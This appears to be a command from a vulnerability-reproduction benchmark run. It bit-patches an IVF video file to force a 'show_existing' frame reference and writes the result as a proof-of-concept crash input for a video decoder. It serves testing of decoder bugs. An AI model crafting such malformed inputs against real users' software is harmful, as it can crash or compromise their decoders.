cd /tmp
python3 -c "
base=open('/tmp/mut_base.ivf','rb').read()
def setbits(d, off, nbits, val):
    d=bytearray(d)
    for i in range(nbits):
        bit=(val>>(nbits-1-i))&1; pos=off+i; byte=pos//8; bitin=7-(pos%8)
        if bit: d[byte]|=(1<<bitin)
        else: d[byte]&=~(1<<bitin)
    return bytes(d)
# frame2 show_existing idx=1 (divergence ref=0/next=1)
d=setbits(base,1953,3,1)
open('/CybinGym_workdir/poc_crash','wb').write(d)
print('wrote poc_crash', len(d))
"
ls -la /CybinGym_workdir/poc_crash; xxd /CybinGym_workdir/poc_crash | head -3
